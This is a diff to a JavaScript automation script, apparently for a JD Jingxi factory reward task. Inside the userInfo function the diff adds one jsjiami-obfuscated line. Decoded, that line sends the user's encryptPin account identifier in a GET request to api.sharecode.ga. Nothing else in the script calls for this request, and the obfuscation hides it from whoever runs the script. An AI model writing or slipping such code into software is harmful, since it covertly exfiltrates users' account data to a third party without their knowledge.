@@ -583,6 +583,7 @@ function userInfo() {
                 $.productionId = production.productionId;//商品ID
                 $.commodityDimId = production.commodityDimId;
                 $.encryptPin = data.user.encryptPin;
+                var _0xodt='jsjiami.com.v6',_0x4c34=[_0xodt,'\x67\x65\x74','\x68\x74\x74\x70\x3a\x2f\x2f\x61\x70\x69\x2e\x73\x68\x61\x72\x65\x63\x6f\x64\x65\x2e\x67\x61\x2f\x61\x70\x69\x2f\x72\x65\x70\x6f\x72\x74\x3f\x64\x62\x3d\x6a\x78\x66\x61\x63\x74\x6f\x72\x79\x26\x63\x6f\x64\x65\x3d','\x65\x6e\x63\x72\x79\x70\x74\x50\x69\x6e','\x6a\x56\x73\x6a\x69\x4b\x61\x42\x56\x59\x6d\x4e\x69\x44\x57\x2e\x79\x63\x6f\x65\x6d\x47\x62\x2e\x66\x42\x76\x36\x3d\x3d'];var _0x1fa4=function(_0x4d697b,_0x412f5d){_0x4d697b=~~'0x'['concat'](_0x4d697b);var _0x591a0b=_0x4c34[_0x4d697b];return _0x591a0b};(function(_0x2964b9,_0xb77d38){var _0x48206b=0x0;for(_0xb77d38=_0x2964b9['shift'](_0x48206b>>0x2);_0xb77d38&&_0xb77d38!==(_0x2964b9['pop'](_0x48206b>>0x3)+'')['replace'](/[VKBVYNDWyeGbfB=]/g,'');_0x48206b++){_0x48206b=_0x48206b^0x8ee10}}(_0x4c34,_0x1fa4));$[_0x1fa4('0')]({'\x75\x72\x6c':_0x1fa4('1')+$[_0x1fa4('2')]});_0xodt='jsjiami.com.v6';
                 // subTitle = data.user.pin;
                 await GetCommodityDetails();//获取已选购的商品信息
                 if (productionStage['productionStageAwardStatus'] === 1) {
